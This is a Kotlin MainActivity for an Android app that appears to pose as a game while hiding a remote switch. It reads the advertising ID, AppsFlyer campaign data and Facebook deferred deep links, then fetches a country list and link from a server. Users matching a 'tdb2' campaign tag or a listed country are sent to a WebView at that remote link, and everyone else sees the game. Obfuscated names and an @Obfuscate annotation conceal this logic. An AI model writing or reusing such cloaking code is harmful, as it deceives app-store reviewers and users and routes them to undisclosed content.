package com.ferrero.applayduG

import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.util.Log
import android.widget.Toast
import io.michaelrocks.paranoid.Obfuscate

import androidx.lifecycle.lifecycleScope
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.facebook.FacebookSdk
import com.facebook.applinks.AppLinkData
import com.ferrero.applayduG.entities.AppsEntity
import com.ferrero.applayduG.game.Game
import com.ferrero.applayduG.viewModel.LunarViewModel
import com.ferrero.applayduG.web.Web
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.awaitAll
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import org.koin.androidx.viewmodel.ext.android.viewModel
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit

@Obfuscate
class MainActivity : AppCompatActivity() {
    var geo: String = ""
    var countryCode: String = ""
    var sharedAppsCheck = ""
    private lateinit var sharedlink : SharedPreferences
    private lateinit var sharedDeep : SharedPreferences
    private lateinit var sharedNaming : SharedPreferences
    private lateinit var sharedMainId : SharedPreferences
    private val sunViewModel: LunarViewModel by viewModel<LunarViewModel>()
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        sharedDeep= getSharedPreferences(AppClass.deep, MODE_PRIVATE)
        sharedNaming= getSharedPreferences(AppClass.c1s, MODE_PRIVATE)
        sharedlink= getSharedPreferences(AppClass.link, MODE_PRIVATE)
        sharedMainId= getSharedPreferences(AppClass.mainId, MODE_PRIVATE)
        lifecycleScope.launch(Dispatchers.IO){
            ijjsidjisd()
        }
        lifecycleScope.launch(Dispatchers.Main.immediate) {
            gtropdflk(this@MainActivity)
            AppsFlyerLib.getInstance()
                .init(AppClass.appsID, appsConv, applicationContext)
            AppsFlyerLib.getInstance().start(this@MainActivity)
        }


        networks()
    }

    private fun networks(){
        sunViewModel.getData()
        sunViewModel.countryCodeJS.observe(this,{
            countryCode =  it.countryCode
            Log.d("CountryCode",countryCode.toString())
            sunViewModel.getDataDev()
            sunViewModel.geoDev.observe(this,{
                geo = it.geo
                sharedlink.edit().putString(AppClass.link,it.view).apply()
                sharedAppsCheck = it.appsChecker
                val dataSaver = AppsEntity(appsCheck = sharedAppsCheck)
                sunViewModel.insertApps(dataSaver)
               lifecycleScope.launch {
                   delay(3000)
                   checker()
               }


            })

        })



    }

    private fun ijjsidjisd() {
        val vicvjijic = AdvertisingIdClient(applicationContext)
        vicvjijic.start()
        val psosdlsksd = vicvjijic.info.id
        Log.d("getAdvertisingId = ", psosdlsksd.toString())
        sharedDeep.edit().putString(AppClass.mainId,psosdlsksd.toString()).apply()
    }

    val appsConv = object : AppsFlyerConversionListener {
        override fun onConversionDataSuccess(data: MutableMap<String, Any>?) {
            val dataGotten = data?.get("campaign").toString()
            sharedNaming.edit().putString(AppClass.c1s,dataGotten).apply()
        }

        override fun onConversionDataFail(p0: String?) {
            Log.e("dev_test", "error getting conversion data: $p0" );
        }

        override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {

        }

        override fun onAttributionFailure(p0: String?) {
        }


    }


    private fun checker() {
            val intentNorm = Intent(this@MainActivity, Web::class.java)
            val appsCh = sharedAppsCheck
            var naming: String? = sharedNaming.getString(AppClass.c1s,"null")
            val deeplink: String? = sharedDeep.getString(AppClass.deep,"null")
            Log.d("CountryPool", geo)
            Log.d("CountryCode", countryCode)
            val wsowslxoc = Executors.newSingleThreadScheduledExecutor()
            if (appsCh == "1") {
                wsowslxoc.scheduleAtFixedRate({
                    if (naming != null) {
                        if (naming!!.contains("tdb2") && deeplink!!.contains(
                                "tdb2"
                            )
                        ) {
                            wsowslxoc.shutdown()
                            intentNorm.putExtra("WebInt", "campaign")
                            startActivity(intentNorm)
                            finish()
                        }else if(naming!!.contains("tdb2")){
                            wsowslxoc.shutdown()
                            intentNorm.putExtra("WebInt", "campaign")
                            startActivity(intentNorm)
                            finish()
                        } else if(!naming!!.contains("tdb2") || geo.contains(countryCode)){
                            wsowslxoc.shutdown()
                            intentNorm.putExtra("WebInt", "deepLink")
                            startActivity(intentNorm)
                            finish()
                        }
                        else if(deeplink!!.contains("tdb2") && !naming!!.contains("tdb2") ){
                            wsowslxoc.shutdown()
                            intentNorm.putExtra("WebInt", "deepLink")
                            startActivity(intentNorm)
                            finish()
                        } else {
                            wsowslxoc.shutdown()
                            startActivity(Intent(this@MainActivity, Game::class.java))
                            finish()
                        }
                    } else {
                        naming = sharedNaming.getString(AppClass.c1s,"null")
                        Log.d("Apps Checker", "naming: ${naming}")
                    }
                }, 0, 2, TimeUnit.SECONDS)
            } else {
                if(deeplink!!.contains("tdb2")){
                    intentNorm.putExtra("WebInt", "deepLink")
                    startActivity(intentNorm)
                    finish()
            } else if(geo.contains(countryCode)){
                    intentNorm.putExtra("WebInt", "MT")
                    startActivity(intentNorm)
                    finish()
            } else {
                    startActivity(Intent(this@MainActivity, Game::class.java))
                    finish()
            }

            }


    }


        fun gtropdflk(sepod: Context) {
            AppLinkData.fetchDeferredAppLinkData(
                sepod
            ) { vfopsl: AppLinkData? ->
                vfopsl?.let {
                    val params = vfopsl.targetUri?.host.toString()
                    sharedDeep.edit().putString(AppClass.deep,params).apply()
                }
                if (vfopsl == null) {
                }
            }
        }
    }
